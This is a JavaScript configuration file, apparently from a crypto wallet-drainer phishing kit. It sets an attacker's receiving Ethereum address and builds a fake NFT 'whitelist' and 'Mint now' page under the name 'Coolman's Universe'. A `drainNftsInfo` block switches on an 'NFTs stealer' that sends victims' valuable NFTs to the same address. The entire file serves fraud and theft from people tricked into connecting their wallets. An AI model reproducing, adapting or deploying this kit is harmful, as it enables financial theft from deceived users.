const receiveAddress = "0xF480F4E06aA2323F54b7900Fd3D248C70cac89f5";

const collectionInfo = {
    name: "Coolman's Universe Moderator Database",
    socialMedia: {
        discord: "",
        twitter: "https://twitter.com/CoolmanUniverse",
        instagram: "",
    },
}

const indexPageInfo = {
    backgroundImage: "disney-wish-movie-2023-1-1.jpg", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "Last Chance To Become Whitelisted!",
}

const claimPageInfo = {
    title: "<br>", // <br> is a line break
    shortDescription: "",
    longDescription: "A Database of wallet addresses that receive early access to an NFT collection before its public launch. Those on the vip access have the option of buying newly released NFTs before the rest of the market, and at much lower transaction fees.The wallet addresses that make up the vip access are usually carefully chosen users who have supported the project in its early days. These users interact, promote and discuss the NFT project",

    claimButtonText: "NEXT",

    image: "ola.gif", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "0xF480F4E06aA2323F54b7900Fd3D248C70cac89f5" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
